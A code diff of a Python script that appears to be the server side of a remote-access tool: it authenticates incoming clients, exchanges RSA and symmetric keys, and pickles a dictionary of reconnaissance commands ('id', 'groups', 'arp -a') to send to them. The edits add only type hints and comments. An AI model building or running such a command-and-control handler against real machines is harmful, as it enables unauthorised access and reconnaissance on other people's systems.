@@ -3,7 +3,7 @@ from itertools import cycle
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 
-def get_ip_address():
+def get_ip_address() -> str:
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     return s.getsockname()[0]
@@ -30,6 +30,8 @@ cmd_dict = {"User Info":["id"],
             "Groups":["groups"],
             "LAN Computers":["arp","-a"]
             }
+
+# Packing commands for transport OTW
 commands = bytes(pickle.dumps(cmd_dict))
 
 def clear_server_port(local_port_number: int) -> None:
@@ -43,7 +45,7 @@ def clear_server_port(local_port_number: int) -> None:
             else:
                 pass
 
-def recv_until(socket):
+def recv_until(socket: socket) -> bytes:
     end_byte = b"\x90"
     received = b""
     while end_byte not in received:
@@ -152,7 +154,7 @@ def main(lhost: str, lport: int, pass_msg: str, msg2: str) -> None:
             if passw_is_true:
                 print(f"\n[+] Successful authentication: {c_ip}:{c_port}")
 
-                            # Send public key
+                # Send public key
                 client.sendall(PEM_public)
 
                 # Obtaining symmetric key from client
